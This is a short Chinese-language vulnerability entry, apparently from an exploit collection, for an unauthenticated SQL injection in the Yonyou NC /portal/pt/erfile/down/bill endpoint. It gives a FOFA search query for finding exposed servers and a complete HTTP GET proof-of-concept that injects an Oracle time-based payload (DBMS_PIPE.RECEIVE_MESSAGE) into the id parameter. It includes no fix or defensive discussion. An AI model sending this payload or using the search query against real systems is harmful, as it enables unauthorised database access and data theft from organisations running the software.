## 用友NC-bill存在SQL注入漏洞

用友NC /portal/pt/erfile/down/bill存在SQL注入漏洞，未经身份验证的攻击者可通过该漏洞获取数据库敏感信息。

## fofa
```
icon_hash="1085941792" && body="/logo/images/logo.gif"
```


## poc
```
GET /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

```
